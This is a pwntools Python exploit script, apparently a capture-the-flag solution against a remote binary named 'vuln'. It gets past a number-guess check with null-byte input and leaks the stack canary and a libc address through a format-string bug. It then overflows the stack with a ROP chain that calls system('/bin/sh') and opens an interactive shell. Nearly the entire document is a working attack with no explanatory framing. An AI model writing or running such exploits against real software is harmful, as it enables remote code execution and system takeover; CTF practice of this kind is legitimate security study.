from pwn import *

HOST = "jota.jointsugm.id"
PORT = "8555"

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (brea kpoints etc)
gdbscript = """
init-pwndbg
b *main+122
b *win+196
c
""".format(
    **locals()
)

# Binary filename
exe = "./vuln"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc6-i386_2.35-0ubuntu1_amd64.so")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset

# Start program
io = start()

offset = 1
# Build the payload
# second_payload = flat({8: [b"a b", p64(0x12A150E3)]})

# Send the payload

# Pass the strcmp
io.sendlineafter(b"Guess 3 digit number : ", b"aaaa\x00" + b"aaaa\x00")
io.sendlineafter(b"Congrats, give me your name :", b"~%55$p-%59$p~")
io.recvuntil(b"~")

leak = io.recvuntil(b"~", drop=True).decode().split("-")
CANARY = int(leak[0], 16)
LIBC_START_MAIN = int(leak[1], 16) - 147  # _libcstartmain+147

info("CANARY: " + hex(CANARY))
info("LIBC: " + hex(LIBC_START_MAIN))

libc.address = LIBC_START_MAIN - libc.symbols["__libc_start_main"]

rop = ROP(libc)
rop.call("system", [next(libc.search(b"/bin/sh"))])

offset = 20
payload = flat({offset: [p64(CANARY), b"AAAA" * 2, rop.chain()]})


io.sendlineafter(b"Any suggestion", payload)

# Got Shell?
io.interactive()
